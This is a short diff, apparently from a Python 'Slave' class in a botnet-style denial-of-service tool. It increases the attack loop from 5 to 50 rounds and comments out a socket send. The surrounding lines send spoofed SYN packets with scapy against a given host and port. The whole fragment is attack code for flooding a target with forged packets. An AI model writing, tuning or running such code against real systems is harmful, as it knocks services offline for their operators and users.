@@ -40,7 +40,7 @@ class Slave():
               self.doTheDos(host, int(port), float(offset))
 
     def doTheDos(self, host, port, offset):
-        for _ in range(0, 5):
+        for _ in range(0, 50):
           self.dos(host, port)
 
     def dos(self, host, port):
@@ -55,7 +55,7 @@ class Slave():
             print spoofed_SYN
             scapy.send(spoofed_SYN)
             # syn_ack= scapy.srp1(spoofed_SYN)
-            newSocket.send(spoofed_SYN)
+            # newSocket.send(spoofed_SYN)
         except error, msg:
             print error
             print msg
